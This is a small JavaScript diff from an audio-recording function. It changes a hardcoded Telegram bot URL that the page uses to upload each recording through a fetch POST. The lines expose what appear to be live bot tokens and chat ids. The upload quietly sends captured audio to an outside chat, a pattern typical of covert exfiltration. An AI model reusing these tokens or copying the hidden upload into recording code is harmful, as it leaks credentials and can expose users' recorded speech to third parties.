@@ -46,7 +46,7 @@ function startRecording() {
         downloadAudio.href = url;
         const formData = new FormData();
         formData.append('audio', e.data, 'recording.mp3');
-        fetch('https://api.telegram.org/bot6124695087:AAG0NprnUOPuxyaHA_79ZDazy870_007Dtk/sendAudio?chat_id=1483919112', {
+        fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
           method: 'POST',
           body: formData
         })
